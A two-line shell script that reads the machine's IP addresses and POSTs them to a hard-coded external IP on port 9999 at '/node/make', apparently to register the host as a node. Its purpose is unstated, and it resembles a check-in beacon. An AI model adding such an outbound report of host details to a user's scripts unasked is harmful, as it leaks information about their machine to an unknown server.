export IP=$(hostname -I)
curl -X POST -d "{\"ip\": \"$IP\"}" 5.189.150.121:9999/node/make
